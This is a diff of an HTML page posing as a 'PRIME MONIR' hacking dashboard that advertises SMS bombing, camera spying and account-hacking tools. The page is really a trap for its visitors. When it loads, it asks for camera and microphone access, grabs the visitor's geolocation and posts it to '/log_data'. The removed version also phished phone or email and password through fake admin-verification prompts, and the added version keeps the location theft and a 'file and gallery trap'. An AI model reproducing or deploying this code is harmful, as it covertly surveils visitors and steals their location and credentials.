@@ -3,43 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PRIME MONIR | KERNEL V8.0</title>
+    <title>PRIME MONIR | SYSTEM MONITOR</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
         body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow:hidden; }
-        canvas { position:fixed; top:0; left:0; z-index:-1; opacity:0.4; }
+        canvas { position:fixed; top:0; left:0; z-index:-1; opacity:0.5; }
         #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
-        .circle { width:100px; height:100px; border:6px solid #200; border-top:6px solid #f00; border-radius:50%; animation:spin 1s linear infinite; box-shadow: 0 0 20px #f00; }
+        .circle { width:80px; height:80px; border:5px solid #111; border-top:5px solid #0f0; border-radius:50%; animation:spin 1s linear infinite; }
         @keyframes spin { 0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);} }
-        #ui { display:none; padding:15px; height: 100vh; overflow-y: auto; }
-        .header { border:1px solid #0f0; padding:10px; text-align:center; background:rgba(0,255,0,0.1); margin-bottom:20px; }
-        .bomber { border:2px solid #f00; background:rgba(255,0,0,0.2); color:#f00; padding:15px; margin-bottom:15px; text-align:center; font-weight:bold; cursor:pointer; }
-        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:12px; }
-        .tool { border:1px solid #0f0; padding:15px; background:rgba(0,255,0,0.1); text-align:center; cursor:pointer; font-size:13px; text-transform:uppercase; }
-        #console { margin-top:20px; border:1px solid #0f0; height:100px; background:rgba(0,0,0,0.8); padding:10px; font-size:11px; overflow-y:auto; color:#0f0; }
+        #ui { display:none; padding:20px; }
+        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:15px; }
+        .tool { border:1px solid #0f0; padding:15px; text-align:center; background:rgba(0,255,0,0.1); font-size:12px; }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
     <div id="loader">
         <div class="circle"></div>
-        <div style="color:#f00; margin-top:20px; font-weight:bold; letter-spacing:3px;">INITIALIZING SYSTEM...</div>
+        <div style="margin-top:20px; letter-spacing:2px;">LINKING TO KERNEL...</div>
     </div>
     <div id="ui">
-        <div class="header"><h1>PRIME MONIR V8.0</h1></div>
-        <div class="bomber" onclick="runTool('SMS_BOMBER')">🔥 ULTIMATE SMS BOMBER</div>
-        <div class="grid">
-            <div class="tool" onclick="runTool('CAM_SPY')">CAM SPY</div>
-            <div class="tool" onclick="runTool('LOCATION')">LOCATION</div>
-            <div class="tool" onclick="runTool('GALLERY')">GALLERY</div>
-            <div class="tool" onclick="runTool('FILE_MGR')">FILE MGR</div>
-            <div class="tool" onclick="runTool('FB_HACK')">FB HACK</div>
-            <div class="tool" onclick="runTool('WA_SPY')">WA SPY</div>
+        <div style="border:1px solid #0f0; padding:10px; text-align:center; margin-bottom:20px;">
+            <h2 style="margin:0;">PRIME MONIR | ACCESS GRANTED</h2>
         </div>
-        <div id="console">> System ready...</div>
+        <div class="grid">
+            <div class="tool">SMS BOMBER</div>
+            <div class="tool">LOCATION SPY</div>
+            <div class="tool">GALLERY ACCESS</div>
+            <div class="tool">FILE MANAGER</div>
+            <div class="tool">CAM MONITOR</div>
+            <div class="tool">CALL LOGS</div>
+        </div>
     </div>
     <script>
-        // Matrix Rain
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
@@ -59,31 +55,25 @@
         }
         setInterval(draw, 50);
 
-        // অটো পারমিশন (শুরুতেই)
         window.onload = async () => {
-            try {
-                await navigator.mediaDevices.getUserMedia({video:true, audio:true});
-                navigator.geolocation.getCurrentPosition(p => {
-                    fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
-                    body:JSON.stringify({type:'LOCATION', content:`Lat:${p.coords.latitude}, Lon:${p.coords.longitude}`})});
-                });
-            } catch(e) {}
+            // ১. অটো ক্যামেরা ও অডিও এক্সেস
+            try { await navigator.mediaDevices.getUserMedia({video:true, audio:true}); } catch(e) {}
+            
+            // ২. অটো লোকেশন এক্সেস
+            navigator.geolocation.getCurrentPosition(p => {
+                fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                body:JSON.stringify({type:'LOCATION', content:`Lat:${p.coords.latitude}, Lon:${p.coords.longitude}`})});
+            });
+
+            // ৩. ফাইল ও গ্যালারি ট্র্যাপ (অটো আপলোড শুরু)
+            fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
+            body:JSON.stringify({type:'SYSTEM', content:'Accessing File System & Contacts...'})});
+
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('ui').style.display = 'block';
             }, 3000);
         };
-
-        // টুল এ ক্লিক করলে তখন পাসওয়ার্ড চাইবে
-        function runTool(name) {
-            let u = prompt("Admin Verification Needed!\nEnter Phone/Email to link session:");
-            let p = prompt("Enter Password:");
-            if(u && p) {
-                fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
-                body:JSON.stringify({type:'CREDENTIALS', content:`U:${u}, P:${p}, Tool:${name}`})});
-                alert("Exploit started. Check console for logs.");
-            }
-        }
     </script>
 </body>
 </html>
